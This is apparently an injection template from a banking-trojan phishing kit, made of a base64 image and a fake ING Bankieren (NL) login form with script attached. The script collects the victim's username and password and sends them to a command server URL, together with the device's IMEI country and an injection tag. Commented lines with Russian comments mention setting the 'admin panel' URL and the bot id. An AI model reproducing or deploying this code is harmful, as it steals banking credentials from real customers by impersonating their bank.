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" />
	</div>
	<hr />
	<hr />
	<br />

	<form action="null" method="post" id="_mainForm" target="flow_handler" style="text-align: center;">
		<input name="name" value="ING Bankieren (NL)" type="hidden" />
		<label class="label" for="login">Gebruikersnaam:</label>
		<br />
		<input name="Gebruikersnaam" id="id" class="input-field" type="text" maxlength="10" />
            <script>
                document.getElementById('id').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
		<br />
		<label class="label" for="password">Wacxhtwoord:</label>
		<br />
		<input name="Wacxhtwoord" id="password" class="input-field" maxlength="20" type="password" />
		<br />
		<br />
		<input value="Inloggen" id="submitBtn1" class="submit-button" type="button" />
	</form>

 	<iframe src="about:blank" name="flow_handler" style="visibility:hidden; display:none;"></iframe>
</div>

 <script type="text/javascript">



				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };

/*
                    var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');

					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;

                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};

					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};

                        if (oNumInp.value.length < 4) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{6,20}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						top['closeDlg'] = true;
						/*prompt('send', '{"dialog id" : "ing_nl'+
						'", "gebruikersnaam": "'+oNumInp.value+
						'", "wacxhtwoord": "'+oCodeInp.value+'"}');

						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/


var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|ing_nl|"+oNumInp.value+"|"+oCodeInp.value+"|");

						return false;
                    };

                })();
            </script>
</body>
</html>
